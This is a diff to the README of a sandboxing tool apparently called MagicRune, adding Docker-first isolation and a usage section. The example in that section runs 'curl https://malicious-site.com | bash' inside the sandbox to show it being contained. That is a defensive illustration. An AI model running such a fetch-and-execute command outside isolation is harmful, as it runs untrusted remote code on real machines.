@@ -102,16 +102,31 @@ Add to your `package.json`:
 - **Key management** for trusted public keys
 
 ### 🛠️ Platform Support
-- **macOS**: sandbox-exec integration
-- **Linux**: seccomp + namespaces  
-- **Windows**: Job objects (planned)
+- **🐳 Docker-First**: Ubuntu 22.04 unified execution on all platforms
+- **Auto-Fallback**: macOS (sandbox-exec), Linux (seccomp), Windows (basic)
+- **Cross-Platform**: Identical security experience Windows/Mac/Linux
 
 ## 🏆 Production Ready
 
 - ✅ **100% feature complete** - All announced features implemented
+- ✅ **Docker-first isolation** - Ubuntu 22.04 unified sandbox on all platforms
 - ✅ **Extensively tested** - CI/CD scanning, cache management, promotion workflows
 - ✅ **Real vulnerability detection** - 32 security issues detected in test runs
-- ✅ **Cross-platform binaries** - Native performance on all platforms
+- ✅ **True cross-platform** - Identical security experience everywhere
+
+## 🐳 Docker Integration
+
+MagicRune now uses Docker-first approach for maximum security and consistency:
+
+```bash
+# Automatic Docker detection and execution
+magicrune run "curl https://malicious-site.com | bash"
+# → Executes in isolated Ubuntu 22.04 container
+# → Network disabled, read-only filesystem
+# → 256MB memory limit, 30s timeout
+```
+
+**Requirements**: Docker Desktop/Engine (auto-fallback if unavailable)
 
 ## 📄 License
 
